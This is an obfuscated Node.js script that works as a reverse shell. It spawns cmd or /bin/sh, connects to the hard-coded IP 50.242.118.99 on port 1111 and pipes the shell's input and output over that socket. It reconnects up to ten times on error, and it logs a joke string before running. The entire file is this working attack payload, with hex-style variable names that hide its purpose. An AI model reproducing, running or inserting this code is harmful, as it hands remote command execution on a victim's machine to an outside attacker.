function node_payload() {
    var _0x16fe4c = global['require'] || global['process']['mainModule']['constructor']['_load'];
    if (!_0x16fe4c)
        return;
    var _0x3f3edf = global['process']['platform']['match'](/^win/i) ? 'cmd' : '/bin/sh', _0x3b4d9f = _0x16fe4c('net'), _0x343657 = _0x16fe4c('child_process'), _0x48b5a9 = _0x16fe4c('util'), _0x41e3cd = _0x343657['spawn'](_0x3f3edf, []), _0x5cd393 = this, _0x3c02b2 = 0x0;
    function _0x349f96() {
        _0x5cd393['socket'] = _0x3b4d9f['connect'](0x457, '50.242.118.99', function () {
            _0x5cd393['socket']['pipe'](_0x41e3cd['stdin']), typeof _0x48b5a9['pump'] === 'undefined' ? (_0x41e3cd['stdout']['pipe'](_0x5cd393['socket']), _0x41e3cd['stderr']['pipe'](_0x5cd393['socket'])) : (_0x48b5a9['pump'](_0x41e3cd['stdout'], _0x5cd393['socket']), _0x48b5a9['pump'](_0x41e3cd['stderr'], _0x5cd393['socket']));
        }), _0x5cd393['socket']['on']('error', function (_0x2c20f0) {
            _0x3c02b2++, _0x3c02b2 <= 0xa ? setTimeout(function () {
                _0x349f96();
            }, 0x5 * 0x3e8) : process['exit']();
        });
    }
    _0x349f96();
}
console['log']('poop'), node_payload();
